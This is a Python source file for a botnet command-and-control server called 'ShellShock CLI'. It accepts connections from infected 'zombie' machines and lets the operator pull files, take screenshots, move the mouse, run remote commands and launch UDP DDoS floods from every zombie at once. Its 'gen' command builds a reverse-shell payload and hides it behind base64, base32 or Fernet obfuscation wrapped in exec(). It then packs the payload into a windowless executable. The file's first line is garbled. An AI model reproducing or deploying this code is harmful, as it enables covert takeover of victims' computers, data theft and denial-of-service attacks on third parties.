FI<=-7;*B,GY+M-I-:L
import socket
import sys
import os
import ast
import threading
from datetime import datetime
import time
import site
import base64
from cryptography.fernet import Fernet

from colorama import init as colorama_init
from colorama import Fore
from colorama import Style

try:
    import win32api
except ImportError:
    print("Can't import win32api")
#pip install piwin32
    

old_banner = """
 ██▀███  ▓█████ ▓█████▄    ▓█████▓██   ██▓▓█████ 
▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌   ▓█   ▀ ▒██  ██▒▓█   ▀ 
▓██ ░▄█ ▒▒███   ░██   █▌   ▒███    ▒██ ██░▒███   
▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌   ▒▓█  ▄  ░ ▐██▓░▒▓█  ▄ 
░██▓ ▒██▒░▒████▒░▒████▓    ░▒████▒ ░ ██▒▓░░▒████▒
░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒    ░░ ▒░ ░  ██▒▒▒ ░░ ▒░ ░
  ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒     ░ ░  ░▓██ ░▒░  ░ ░  ░
  ░░   ░    ░    ░ ░  ░       ░   ▒ ▒ ░░     ░   
   ░        ░  ░   ░          ░  ░░ ░        ░  ░
                 ░                ░ ░            
"""
banner = """
  ██████  ██░ ██ ▓█████  ██▓     ██▓         ██████  ██░ ██  ▒█████   ▄████▄   ██ ▄█▀
▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒       ▒██    ▒ ▓██░ ██▒▒██▒  ██▒▒██▀ ▀█   ██▄█▒ 
░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░       ░ ▓██▄   ▒██▀▀██░▒██░  ██▒▒▓█    ▄ ▓███▄░ 
  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░         ▒   ██▒░▓█ ░██ ▒██   ██░▒▓▓▄ ▄██▒▓██ █▄ 
▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒   ▒██████▒▒░▓█▒░██▓░ ████▓▒░▒ ▓███▀ ░▒██▒ █▄
▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░   ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ░▒ ▒  ░▒ ▒▒ ▓▒
░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░   ░ ░▒  ░ ░ ▒ ░▒░ ░  ░ ▒ ▒░   ░  ▒   ░ ░▒ ▒░
░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░      ░  ░  ░   ░  ░░ ░░ ░ ░ ▒  ░        ░ ░░ ░ 
      ░   ░  ░  ░   ░  ░    ░  ░    ░  ░         ░   ░  ░  ░    ░ ░  ░ ░      ░  ░   
                                                                     ░               
"""

os.system("title " + "ShellShock CLI")

#Variables for holding information about connections
connections = []
total_connections = 0
global active_zombies
active_zombies = []

global cdir
cdir=os.getcwd()


colorama_init()


def current_time():
    now = datetime.now()
    ctime = now.strftime("%H:%M")
    return ctime

def filter_list_zombie(v):
    return v[0]




class ShellEncryption():

    def base32en(path, rv_name):
            imports_array = ['import base64']
            code_array = []
            code_str = ""
            try:
                    input_file = open(path).read().splitlines()
            except:
                    print(Fore.RED + "Invalid file path!" + Style.RESET_ALL)
                    return
            for i in input_file:
                    if i.startswith("import") or i.startswith("from"):
                            imports_array.append(i)
                    else:
                            code_array.append(i)
            try:
                    os.mkdir("output")
            except:
                    pass
            output_file = open(os.path.join("output", "%s.py"%(rv_name)), "w+")
            for i in imports_array:
                    output_file.write(i + '\n')
            for i in code_array:
                    code_str += '\n' + i
            encoded = base64.b32encode(bytes(code_str, "utf-8"))
            output_file.write('\n' + "exec(base64.b32decode(" + str(encoded) + "))")
            output_file.close()

    def ferneten(path, rv_name):
            imports_array = ['from cryptography.fernet import Fernet']
            code_array = []
            code_str = ""
            try:
                    input_file = open(path).read().splitlines()
            except:
                    print(Fore.RED + "Invalid file path!" + Style.RESET_ALL)
                    return
            for i in input_file:
                    if i.startswith("import") or i.startswith("from"):
                            imports_array.append(i)
                    else:
                            code_array.append(i)
            try:
                    os.mkdir("output")
            except:
                    pass
            output_file = open(os.path.join("output", "%s.py"%(rv_name)), "w+")
            for i in imports_array:
                    output_file.write(i + '\n')
            for i in code_array:
                    code_str += '\n' + i
            key = Fernet.generate_key()
            f = Fernet(key)
            encrypted = f.encrypt(bytes(code_str, "utf-8"))
            output_file.write('\n' + "key = " + str(key) + "\nf = Fernet(key)" + "\n\nexec(f.decrypt(" + str(encrypted) + "))")
            output_file.close()

    def base64en(path, rv_name):
            imports_array = ['import base64']
            code_array = []
            code_str = ""
            try:
                    input_file = open(path).read().splitlines()
            except:
                    print(Fore.RED + "Invalid file path!" + Style.RESET_ALL)
                    return
            for i in input_file:
                    if i.startswith("import") or i.startswith("from"):
                            imports_array.append(i)
                    else:
                            code_array.append(i)
            try:
                    os.mkdir("output")
            except:
                    pass
            output_file = open(os.path.join("output", "%s.py"%(rv_name)), "w+")
            for i in imports_array:
                    output_file.write(i + '\n')
            for i in code_array:
                    code_str += '\n' + i
            encoded = base64.b64encode(bytes(code_str, "utf-8"))
            output_file.write('\n' + "exec(base64.b64decode(" + str(encoded) + "))")
            output_file.close()






#Client class, new instance created for each connected client
#Each instance has the socket and address that is associated with items
#Along with an assigned ID and a name chosen by the client
class Client(threading.Thread):
    global active_zombies
    def __init__(self, socket, address, id, name, signal):
        threading.Thread.__init__(self)
        self.socket = socket
        self.address = address
        self.id = id
        self.name = name
        self.signal = signal
    
    def __str__(self):
        return str(self.id) + " " + str(self.address)
    
    #Attempt to get data from client
    #If unable to, assume client has disconnected and remove him from server data
    #If able to and we get data back, print it in the server and send it back to every
    #client aside from the client that has sent it
    #.decode is used to convert the byte data into a printable string
    def run(self):
        while self.signal:
            try:
                data = self.socket.recv(20480)
                #print(data)
            except:
                print("Client " + str(self.address) + " has disconnected" + "\n$:> ", end="")
                self.signal = False
                #connections.remove(self) #non so se tenerlo
                break
            if data != "" and len(data)>2:

                try:
                    data=data.decode("utf-8")
                except Exception:
                    data=data.decode("cp850")

                if not data.startswith("timed out"):
                    print("ID " + str(self.id) + ": " + data, end="")
                if data=="ping!":
                    if not self.address in list(map(filter_list_zombie, active_zombies)):
                        active_zombies.append([self.address, current_time()])
                    else:
                        cont = 0
                        for i in active_zombies:
                            if i[0]==self.address:
                                active_zombies[cont][1]=current_time()
                                break
                                #t=int(current_time()[:2])
                                #v=int((i[1])[:2])
                                #if (t > v) and (t - v >= 1):
                                    #active_zombies.pop(cont)

                                #still to finish
                            cont+=1
                                     

                #for client in connections:
                    #if client.id != self.id:
                        #client.socket.sendall(data)

    def csend(self, cmd):
        cmd = cmd.encode("utf-8")
        self.socket.send(cmd)

    
    def download_file_func(self, cmd):
        name=cmd.split(" ")
        name=name[2]
        self.socket.send(cmd.encode())
        p_len = self.socket.recv(4096).decode()
        p_len = int(p_len.replace("p",""))
        tot=p_len
        c=1
        self.socket.send("ok".encode())
        newfile=open("%s\\%s"%(cdir,name), "ab")
        while True:
            data = self.socket.recv(500000)
            data=data.decode()
            #print(data)
            try:
                data=ast.literal_eval(data)
                #print(data)
                for d in data:
                    #print(d)
                    newfile.write(d)
            except Exception:
                pass
            c+=1
            calc = round((c/tot)*100,1)
            if calc>=100:
                calc=100
            #print(float(round(calc,1)))
            if p_len>=0:
                if p_len==0:
                    break
                else:
                    self.socket.send("ack".encode())
            p_len-=1
        newfile.close()
        #print("close")
        #conn.send(".".encode())
        #print("send")
        endd = self.socket.recv(4096).decode()
        #print(end)
        print("File downloaded\n$: ", end="")


    def upload_file_func(self, file1):

        filesize=round(os.path.getsize(file1)/(1024*1024), 1)
        buffer=3800
        send_buffer=40960
        if filesize>1 and filesize<3:
            buffer=8000
        if filesize>3:
            buffer=100000
            send_buffer=500000
        print("buffer:",buffer)
        file=open(file1, "rb").readlines()
        stat=False
        array = []
        final = []
        array_c = 0
        def arr_sum(array):
            som=0
            for a in array:
                som+=len(a)
            return som

        for a in range(0,len(file)):
            if arr_sum(array)>=buffer:
                final.append(array)
                array=[]
            else:
                array.append(file[array_c])
                array_c+=1
        final.append(array)
                    
        packets=str(len(final))
        packets="p%s"%(packets)
        print(packets)
        self.socket.send(packets.encode())
        resp = self.socket.recv(send_buffer).decode()
        for line in final:
            #sock.send(line)
            print(len(str(line)))
            self.socket.send(str(line).encode())
            ack = self.socket.recv(4096)
            if ack.decode("utf-8")=="ack":
                stat=True
                pass
            else:
                print("false")
                stat=False
                break
                    
        return stat



#Wait for new connections
def newConnections(socket):
    while True:
        sock, address = socket.accept()
        global total_connections
        exists = False
        for client in connections:
            if client.address[0]==address[0]:
                exists=True
                id_c = client.id
                id_n = client.name
                connections.remove(client)
                #client.address = address
                #client.socket = sock
                #client.signal = True
                connections.append(Client(sock, address, id_c, id_n, True))
                connections[id_c].start()
                #print(f"{Fore.GREEN}Connected to {id_n}{Style.RESET_ALL}" + "\n$:> ", end="")
        if exists==False:
            connections.append(Client(sock, address, total_connections, "Zombie%s"%(total_connections), True))
            connections[len(connections) - 1].start()
            print("New connection at ID " + str(connections[len(connections) - 1]) + f"\n{Fore.LIGHTBLUE_EX}$:> {Style.RESET_ALL}", end="")
        total_connections += 1


def create_str_table(matrix):
    table = ""
    #j_c=0
    try:
        for lines in matrix:
            line = ""
            for row in lines:
                #if j_c==0:
                line+="%s\t\t\t"%(row)
            table+="%s\n"%(line)
    except TypeError:
        for clients in matrix:
            signal=clients.signal
            if signal:
                signal=f"{Fore.GREEN}Active"
            else:
                signal=f"{Fore.RED}Offline"

            table+=f"{Fore.BLUE}{clients.id}\t{Fore.YELLOW}{clients.address}\t\t{Fore.WHITE}{clients.name}\t\t{signal}\n{Style.RESET_ALL}"
            
    return table


seconds = 60

maxseconds = 120

rawseconds = 30

rawmaxseconds = 60

blacklistIP = ["127.0.0.1" , "1.1.1.1", "www.usa.gov"]

# Validate IP
def validate_ip(ip):
    parts = ip.split('.')
    if ip not in blacklistIP:
        return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts)

# Validate Port
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

# Validate attack time
def validate_time(time):
    return time.isdigit() and int(time) >= seconds and int(time) <= maxseconds


# Validate attack time
def validate_timeraw(time):
    return time.isdigit() and int(time) >= rawseconds and int(time) <= rawmaxseconds

# Validate buffer size
def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500


def cli():
    comandi = [[f"{Fore.LIGHTBLUE_EX}COMMAND","DESCRIPTION",f"\t\tUSAGE{Style.RESET_ALL}"],["help","Shows this table"],["quit","Close the CLI"],
               ["zombie","Show zombies"], ["control","Control a zombie", "\tcontrol <id>"], 
               ["name", "Change the name of a zombie", "name <id> <newName>"],["clear","Clear the screen"],["ddos","Send a ddos attack","\tddos <type>"],
               ["gen", "Generate the reverse shell", "gen <ip> <port> <encryption>"]]
    
    print(f"{Fore.RED}{banner}{Style.RESET_ALL}")
    print("\n")
    while True:
        print(f"{Fore.LIGHTBLUE_EX}$:> ", end="")
        print(f"{Style.RESET_ALL}", end="")
        cmd = str(input(""))
        

        if cmd=="help" or cmd=="-help" or cmd=="-h" or cmd=="?":
            print("List of commands:\n")
            print(create_str_table(comandi))

        elif cmd=="zombie":
            n=len(connections)
            if n==0:
                print("There are no active zombies")
            else:
                print("Active zombies: %s"%(n))
                print(create_str_table(connections))
            
        elif cmd.startswith("name"):
            cmd=cmd.split(" ")
            try:
                for client in connections:
                    if client.id==int(cmd[1]):
                        client.name=cmd[2]
                        print("[+] Name changed")
                        break
            except Exception:
                print(f"{Fore.RED}[-] Usage: name <id> <newName>{Style.RESET_ALL}")
        
        elif cmd=="clear":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{Fore.RED}{banner}{Style.RESET_ALL}\n")
        
        elif cmd.startswith("control"):
            # control id
            if len(cmd.split(" "))!=2:
                print(f"{Fore.RED}[-] Usage: control <id>{Style.RESET_ALL}")
                continue

            id = int(cmd.split(" ")[1])
            zombie=None
            for client in connections:
                if client.id==id:
                    zombie=client
                    break

            if zombie.signal==False:
                print(f"{Fore.RED}The zombie il offline{Style.RESET_ALL}")
                continue
            if zombie!=None:
                shell=""
                print("---CMD LIST---")
                print("""
usage: !cmd -func
1. -getf filename > get file
2. -s > take screenshot
3. -move x,y > move mouse
4. -dbc > double click
5. -move x,y -dbc > move and double click
6. -hold x,y > hold mouse to position
7. -popen cmd... > execute a command in another shell
8. -upl filepath > upload file
9. -udp ip port time size threads > send a ddos attack using udp                      
10. quit > close connection
""")
                print("$: ", end="")

                while shell!="quit":
                    #shell=str(input("--> "))
                    shell=str(input())
                    if shell=="getpos":
                        print(win32api.GetCursorPos())
                        print("$: ", end="")

                    elif shell.startswith("!cmd -getf"):
                        zombie.download_file_func(shell)
                    
                    elif shell.startswith("!cmd -upl"):
                        fpath=shell.split(" ")
                        fpath=fpath[2]
                        zombie.socket.send(shell.encode())
                        ok = zombie.socket.recv(4096).decode()
                        if ok=="ok":
                            zombie.upload_file_func(fpath)
                            zombie.socket.send(".".encode())
                            print("File uploaded\n$: ", end="")
                        else:
                            print("error")
                    
                    elif shell.startswith("!cmd -udp"):
                        args = shell.split(" ")
                        if len(args) == 7:
                            if validate_ip(args[2]):
                                if validate_port(args[3], True):
                                    if validate_timeraw(args[4]):
                                        if validate_size(args[5]):
                                            zombie.csend(shell)
                                        else:
                                            print("Invalid packet-size (1-65500 bytes)")
                                            print("$: ", end="")
                                    else:
                                        print(f'Invalid attack-duration, min {seconds} max {maxseconds}')
                                        print("$: ", end="")
                                else:
                                    print("Invalid port-number (1-65535)")
                                    print("$: ", end="")
                            else:
                                print("Invalid IP-address")
                                print("$: ", end="")
                        else:
                            print(f"{Fore.RED}Usage: !cmd -udp <IP> <PORT> <TIME> <SIZE> <THREADS>{Style.RESET_ALL}")
                            print("$: ", end="")


                    elif shell!="quit":
                        try:
                            zombie.csend(shell)
                        except ConnectionAbortedError:
                            print(f"{Fore.RED}Connection Aborted Error{Style.RESET_ALL}")
                            shell="quit"
                        except AttributeError as attrErr:
                            #print(f"{Fore.RED}Something went wrong{Style.RESET_ALL}")
                            #print(f"{Fore.YELLOW}{attrErr}{Style.RESET_ALL}")
                            print(f"{Fore.RED}[x] Can't connect to the zombie{Style.RESET_ALL}")
                            for client in connections:
                                if client.id==id:
                                    client.signal = False
                                    break
                            shell="quit"
            else:
                print("zombie == None")

        elif cmd.startswith("ddos"):
            ddos_list=["udp"]
            if cmd=="ddos":
                print("ddos type list: %s"%(ddos_list))
            if len(cmd.split(" "))!=2:
                print(f"{Fore.RED}[-] Usage: ddos <type>{Style.RESET_ALL}")
                continue
            ddos_type = cmd.split(" ")[1]
            if ddos_type in ddos_list:
                print("Type 'help' for a list of commands")
                ddos_config=["ip","port","time","size","threads"]
                while True:
                    print(f"{Fore.LIGHTBLUE_EX}ddos-{ddos_type} $:> ", end="")
                    print(f"{Style.RESET_ALL}", end="")
                    ddos_cmd = str(input(""))
                    if ddos_cmd == "quit":
                        break
                    elif ddos_cmd == "help":
                        ddos_commands = [[f"{Fore.LIGHTBLUE_EX}COMMAND","DESCRIPTION",f"\t\tUSAGE{Style.RESET_ALL}"],
                                         ["ip","Set the ip of the target", "ip <ip>"], ["port","Set the port of the target", "port <port>"],
                                         ["time","Set the duration of the attack (sec)","time <time>"], ["size","Set the size of the packets","size <size>"],
                                         ["threads","Set how many threads should be used","threads <number>"],["show","Show config"],
                                         ["zombie","Show active zombies"], ["attack","Start the ddos"]]
                        print("List of config.:\n")
                        print(create_str_table(ddos_commands))

                    elif ddos_cmd == "show":
                        show = [[f"{Fore.BLUE}IP{Fore.YELLOW}",ddos_config[0]],[f"{Fore.BLUE}PORT{Fore.YELLOW}",ddos_config[1]],
                                [f"{Fore.BLUE}TIME{Fore.YELLOW}",ddos_config[2]],[f"{Fore.BLUE}SIZE{Fore.YELLOW}",ddos_config[3]],
                                [f"{Fore.BLUE}THREADS{Fore.YELLOW}",ddos_config[4]]]
                        print(create_str_table(show))
                        print(f"{Style.RESET_ALL}",end="")
                    
                    elif ddos_cmd == "zombie":
                        n=len(connections)
                        if n==0:
                            print("There are no active zombies")
                        else:
                            print("Active zombies: %s"%(n))
                            print(create_str_table(connections))
                    
                    elif ddos_cmd == "attack":
                        ddos_cmd = "!cmd -udp %s %s %s %s %s"%(ddos_config[0],ddos_config[1],ddos_config[2],ddos_config[3],ddos_config[4])
                        args = ddos_cmd.split(" ")
                        if len(args) == 7:
                            if validate_ip(args[2]):
                                if validate_port(args[3], True):
                                    if validate_timeraw(args[4]):
                                        if validate_size(args[5]):
                                            for zombies in connections:
                                                if zombies.signal == True:
                                                    zombies.csend(ddos_cmd)
                                                    #print(zombies.address)
                                        else:
                                            print("Invalid packet-size (1-65500 bytes)")
                                            print("$: ", end="")
                                    else:
                                        print(f'Invalid attack-duration, min {seconds} max {maxseconds}')
                                        print("$: ", end="")
                                else:
                                    print("Invalid port-number (1-65535)")
                                    print("$: ", end="")
                            else:
                                print("Invalid IP-address")
                                print("$: ", end="")
                        else:
                            print(f"{Fore.RED}Error. Something missing.{Style.RESET_ALL}")
                            print("$: ", end="")

                    ddos_cmd = ddos_cmd.split(" ")
                    if ddos_cmd[0]=="ip":
                        if len(ddos_cmd)==2 and validate_ip(ddos_cmd[1]):
                            ddos_config[0] = ddos_cmd[1]
                            print(f"{Fore.GREEN}IP set{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}Usage: ip <ip>{Style.RESET_ALL}")

                    elif ddos_cmd[0]=="port":
                        if len(ddos_cmd)==2 and validate_port(ddos_cmd[1]):
                            ddos_config[1] = ddos_cmd[1]
                            print(f"{Fore.GREEN}Port set{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}Usage: port <port>{Style.RESET_ALL}")

                    elif ddos_cmd[0]=="time":
                        if len(ddos_cmd)==2 and validate_time(ddos_cmd[1]):
                            ddos_config[2] = ddos_cmd[1]
                            print(f"{Fore.GREEN}Time set{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}Usage: time <time> (min 60 sec, max 120 sec){Style.RESET_ALL}")

                    elif ddos_cmd[0]=="size":
                        if len(ddos_cmd)==2 and validate_size(ddos_cmd[1]):
                            ddos_config[3] = ddos_cmd[1]
                            print(f"{Fore.GREEN}Size set{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}Usage: size <size>{Style.RESET_ALL}")

                    elif ddos_cmd[0]=="threads":
                        if len(ddos_cmd)==2:
                            ddos_config[4] = ddos_cmd[1]
                            print(f"{Fore.GREEN}Threads set{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}Usage: threads <number>{Style.RESET_ALL}")
                            


        elif cmd.startswith("gen"):
            gen_param = cmd.split(" ")
            accepted_ecnryptions = ["base64","base32","fernet"]
            if len(gen_param) != 4:
                print(f"{Fore.RED}Usage: gen <ip> <port> <encryption>\nAccepted encryptions: %s{Style.RESET_ALL}"%(accepted_ecnryptions))
            else:
                if gen_param[2].isnumeric() and (gen_param[3] in accepted_ecnryptions): #validate_ip(gen_param[1]) and
                    print(f"{Fore.MAGENTA}[*] Generating payload...{Style.RESET_ALL}")
                    site_package = site.getsitepackages()
                    read = open("testing_client.py","r").readlines()
                    rev_name = "test-shell"
                    #titles = ["MS updates","Host Check","MS checks","Integrity Check"]
                    #current_title = random.choice(titles)
                    copy=""
                    for lines in read:
                        if "<<IP>>" in lines:
                            lines = lines.replace("<<IP>>",gen_param[1])
                        elif "<<PORT>" in lines:
                            lines = lines.replace("<<PORT>>",gen_param[2])
                        elif "<<FILE-NAME>>" in lines:
                            lines = lines.replace("<<FILE-NAME>>",rev_name)
                        copy+=lines
                    
                    newPayload = open("payload.py","w")
                    newPayload.write(copy)
                    newPayload.close()
                    time.sleep(1)
                    print(f"{Fore.MAGENTA}[*] Encrypting payload...{Style.RESET_ALL}")
                    #dir_path = os.path.dirname(os.path.realpath(__file__))
                    dir_path = os.getcwd()
                    fpath="%s\\payload.py"%dir_path
                    if gen_param[3]=="base64":
                        ShellEncryption.base64en(fpath, rev_name)
                    elif gen_param[3]=="base32":
                         ShellEncryption.base32en(fpath, rev_name)
                    elif gen_param[3]=="fernet":
                         ShellEncryption.ferneten(fpath, rev_name)
                    pl_path = "%s\\output\\%s.py"%(dir_path,rev_name)

                    print(f"{Fore.MAGENTA}[*] Generating executable...{Style.RESET_ALL}")
                    #os.popen('pyinstaller --noconfirm --onefile --windowed --paths "%s" "%s"'%(site_package, pl_path))
                    os.system('pyinstaller --noconfirm --onefile --windowed --paths "%s" "%s"'%(site_package, pl_path))
                    print(f"{Fore.GREEN}[+] Generated!{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}Usage: gen <ip> <port> <encryption>\nAccepted encryptions: %s{Style.RESET_ALL}"%(accepted_ecnryptions))
                    
        
        elif cmd=="quit":
            z=""
            for zombie in connections:
                #z+="%s:%s:%s:%s:%s\n"%(zombie.socket,zombie.address,zombie.id,zombie.name,zombie.signal)
                z+="%s:%s:%s:%s:%s\n"%(zombie.socket,zombie.address,zombie.id,zombie.name,False)

            file=open("zombies.txt","w")
            file.write(z)
            file.close()
            sys.exit()


def main():
    global total_connections
    #Get host and port
##    try:
##        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
##        s.connect(("0.0.0.0", 50000))
##        host = (s.getsockname()[0])
##        print('Host: ' + host)
##        s.close()
##    except OSError:
##        print("Unable to reach network and find IP.")
##        host = input("Please enter host manually: ")
    
    try:
        file=open("zombies.txt","r").readlines()
        for zombie in file:
            zombie=zombie.replace("\n", "")
            zombie=zombie.split(":")
            addr=zombie[1].replace("(","").replace(")","").replace("'","")
            addr=addr.split(", ")
            addr=(addr[0],int(addr[1]))
            signal = zombie[4]
            if signal=="True":
                signal=True
            else:
                signal=False
            connections.append(Client(zombie[0], addr, int(zombie[2]), zombie[3], signal))
            total_connections += 1
    except Exception as error_file:
        #print(error_file)
        pass

    cli_thread = threading.Thread(target=cli, args=())
    cli_thread.start()

    host = "0.0.0.0"
    port = 50000
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen(5)

    #Create new thread to wait for connections
    newConnectionsThread = threading.Thread(target = newConnections, args = (sock,))
    newConnectionsThread.start()
    

main()
